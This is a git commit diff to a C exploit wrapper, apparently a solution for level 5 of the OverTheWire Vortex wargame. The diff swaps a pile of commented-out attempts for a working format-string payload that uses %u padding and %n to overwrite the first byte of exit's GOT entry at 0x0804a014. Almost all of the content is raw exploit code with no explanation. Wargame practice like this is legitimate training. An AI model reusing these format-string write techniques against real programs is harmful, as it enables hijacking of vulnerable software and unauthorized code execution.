b1504931946112eee82919e362bf0c33e14dded1
bmoar <ben@rooted.systems>
2016-02-14 14:55:52 -0500

    overwrite the first byte of exit

--- otw/vortex/5/exec_wrapper.c
+++ otw/vortex/5/exec_wrapper.c
@@ -13,19 +13,8 @@ char payload_buff[16777216];
 
 char *newenv[] = { 
     "CCCC", 
-    "\x14\xa0\x04\x08", 
-    //"AAAAAAAAAAAAAAAA%.010u%1$x%.010u%1$x%.010u%1$x%.010u%1$x",
-    //"AAAA%.010u",
-//AAAA4160737280|804847b[Inferior 1 (process 235624) exited with code 01]
-    // need to overwrite *0x804a014 with env[3]
-    //"AAAA%10$x.%n\x14\xa0\x04\x08",
-    //"\x14\xa0\x04\x08%48$x|%n|",
-    //"%08x.%08x.%08x.%08x.%08x.%08x %s \n",
-    //"A * 0x0804a014%.010u%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%n%1uAAA\x14\xa0\x04\x08.\x14\xa0\x04\x08%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%n\n",
-    //"AAAaA%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%xAAA\x14\xa0\x04\x08.\x14\xa0\x04\x08%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x\n",
-    //"\x14\xa0\x04\x08%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%08x|%s|", 
-    "\x14\xa0\x04\x08%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%.f.%08x.%.f|%s|", 
-    //"%08x.%08x.%08x.%08x.", 
+    "BBBB", 
+    "\x14\xa0\x04\x08%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u....%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%253u%n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 
     "\x14\xa0\x04\x08", 
 };
 
